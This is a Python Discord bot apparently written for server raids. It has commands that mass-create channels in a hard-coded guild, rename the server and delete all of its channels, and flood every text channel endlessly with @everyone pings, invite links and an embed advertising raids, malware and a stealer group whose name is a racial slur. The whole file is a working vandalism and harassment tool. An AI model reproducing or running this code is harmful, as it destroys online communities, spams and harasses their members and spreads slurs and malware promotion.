import discord
from discord.ext import commands
import asyncio
import aiohttp
import json

with open('config.json') as f:
    config = json.load(f)

TOKEN = config['token']
PREFIX = config['prefix']
GUILD_ID = "1407533053055864923"

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.guild_messages = True

bot = commands.Bot(command_prefix=PREFIX, intents=intents)

@bot.event
async def on_ready():
    print(f"Creo que {bot.user} esta conectado :v")

async def create_channel(session, nombre, guild_id, token):
    url = f"https://discord.com/api/v10/guilds/{guild_id}/channels"
    headers = {
        "Authorization": f"Bot {token}",
        "Content-Type": "application/json"
    }
    data = {"name": nombre, "type": 0}

    async with session.post(url, headers=headers, json=data) as response:
        if response.status == 429:
            retry_after = int(response.headers.get('Retry-After', 1))
            await asyncio.sleep(retry_after)
            await create_channel(session, nombre, guild_id, token)

@bot.command()
async def raid(ctx):
    async with aiohttp.ClientSession() as session:
        tasks = [create_channel(session, "SelfPwnedThis", GUILD_ID, TOKEN) for _ in range(50)]
        await asyncio.gather(*tasks)

@bot.command()
@commands.has_permissions(administrator=True)
async def nuke(ctx):
    try:
        await ctx.message.delete()
    except:
        pass

    guild = ctx.guild
    if guild is None:
        return

    image_url = "https://cdn.discordapp.com/icons/1406989334933930228/b1dc437cf58516f6aefc6c3804b0a963.webp?size=1024"

    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(image_url) as resp:
                if resp.status == 200:
                    icon_bytes = await resp.read()
                    try:
                        await guild.edit(name="selfpwnedthisshit", icon=icon_bytes)
                    except:
                        pass
    except:
        pass

    try:
        await asyncio.gather(*(channel.delete() for channel in guild.channels if channel))
    except:
        pass

    try:
        await guild.create_text_channel("selfpwnedthis")
    except:
        pass
    
@bot.command()
async def spam(ctx):
    guild = ctx.guild
    if guild is None:
        return

    channels = guild.text_channels

    embed2 = discord.Embed(
        title="Dev social media",
        description=(
            "_ _ ⠀   ⠀  :rat:      ***__Rbot⠀ ⠀ Raids⠀ ⠀ Malware__***\n\n"
            "**         __Only ils & Your Mother__**\n\n"
            "   [/NiggaStealer](https://discord.gg/3SJscqyafq)\n"
            " [/SWgvng](https://discord.gg/3SJscqyafq)\n\n"
            "**SWgvng** Pwned Shitty Server\n\n"
            "~~F = all words that start with the letter :skull_crossbones:~~"
        ),
        color=0x2F3136
    )
    embed2.set_image(
        url="https://cdn.discordapp.com/attachments/1406989335458480283/1407749437346021397/young-ezgif.com-optimize.gif"
    )

    tasks = []
    for channel in channels:
        for _ in range(20):
            tasks.append(channel.send("@everyone @here https://discord.gg/3SJscqyafq"))
            tasks.append(channel.send(embed=embed2))
            tasks.append(channel.send("@everyone @here https://discord.gg/3SJscqyafq"))

    try:
        await asyncio.gather(*tasks)
    except discord.errors.HTTPException:
        pass

    for channel in channels:
        while True:
            try:
                await channel.send("@everyone @here")
                await channel.send(embed=embed2)
                await channel.send("@everyone @here")
                await asyncio.sleep(1)
            except discord.Forbidden:
                pass
            except discord.errors.HTTPException:
                pass

bot.run(TOKEN)
